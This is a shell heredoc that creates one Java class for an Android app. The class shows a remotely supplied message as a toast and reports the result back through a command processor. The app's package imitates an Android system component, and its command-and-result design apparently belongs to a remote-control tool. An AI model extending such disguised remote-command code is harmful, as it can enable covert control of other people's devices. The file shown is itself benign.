cat > app/src/main/java/com/android/system/protection/commands/ShowMessage.java << 'EOF'
package com.android.system.protection.commands;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.widget.Toast;

import com.android.system.protection.api.CommandProcessor;

import org.json.JSONObject;

public class ShowMessage {

    public static void show(Context context, JSONObject params, String commandId) {
        String messageText = params.optString("text", "رسالة فارغة");

        new Handler(Looper.getMainLooper()).post(() -> {
            Toast.makeText(context, messageText, Toast.LENGTH_LONG).show();
        });

        JSONObject result = new JSONObject();
        try {
            result.put("status", "shown");
            result.put("message", messageText);
        } catch (Exception e) {}
        CommandProcessor.sendResult(context, commandId, result);
    }
}
EOF